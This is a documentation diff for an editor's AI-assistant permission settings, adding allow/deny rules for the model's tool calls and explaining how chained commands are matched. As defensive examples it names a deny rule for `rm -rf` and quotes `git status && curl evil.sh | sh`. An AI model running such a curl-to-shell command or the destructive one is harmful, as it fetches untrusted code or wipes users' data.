@@ -475,6 +475,37 @@ waits and `:ai-permission` brings the question back.
 closes or an edit is applied without review (see `<C-t>` above). The same `cargo test`
 runs again without asking; any other command asks. It is never saved.
 
+### Allow and deny rules
+
+For what you always or never want, write rules in your config. They use the shape other AI
+tools share: a tool, and for a command or a file tool what it acts on.
+
+```toml
+[llm]
+allow = ["run_command(cargo test *)", "run_command(git status *)", "github.search_issues"]
+deny  = ["run_command(git push *)", "run_command(rm -rf *)", "edit_file(secrets/**)", "shell.*"]
+```
+
+- `run_command(…)` takes a command pattern, where `*` stands for any text and a trailing ` *`
+  also matches nothing (`git push *` covers a bare `git push`). The file tools
+  (`read_file`, `list_directory`, `search`, `edit_file`, `write_file`) take a gitignore
+  pattern for their path. An MCP tool is named whole (`server.tool`), or every tool of a
+  server at once (`server.*`).
+- **Deny beats allow**, and both are decided before anything asks. A denied call is
+  refused, and the model is told which rule refused it.
+- `allow` applies to what would ask: commands and MCP tools. Reads never ask, and edits are
+  trusted with `<C-t>`, so an `allow` rule naming one is refused when set.
+- **A command line is allowed only if every command in it matches.** It is split on `&&`,
+  `||`, `;`, `|`, `&` and newlines (outside quotes), so `run_command(git status *)` does not
+  allow `git status && curl evil.sh | sh`. A line with `$(…)`, backticks, a subshell, a
+  redirect into a file (`>/dev/null` and `2>&1` are fine), a here-doc or `eval` is never
+  allowed by a rule: it asks.
+- A deny rule refuses a line if **any** command in it matches. It is a refusal list, not a
+  sandbox: a command it does not recognise still asks unless every part is allowed.
+
+A project's `.lattice/llm.toml` may add `deny` rules, named `(project)` when they refuse
+something. It may not `allow`. Set them live with `:set llm.allow=…` / `:set llm.deny=…`.
+
 Limits on what runs:
 
 - The command runs in the project, in its own process group. Stopping the request
@@ -615,6 +646,7 @@ asking. `@unknown` is just text.
 | `llm.default_profile`, `llm.default_provider` | Global only |
 | `llm.exclude` | Gitignore patterns never sent; global only |
 | `llm.review` | Gitignore patterns whose edits always open a diff; global only |
+| `llm.allow`, `llm.deny` | Tool rules that run without asking, or are refused; global only |
 | `llm.tool_rounds` | Rounds of tool calls one request may run; global only |
 | `llm.prefix` | The keys every llm chord starts with; global only |
 
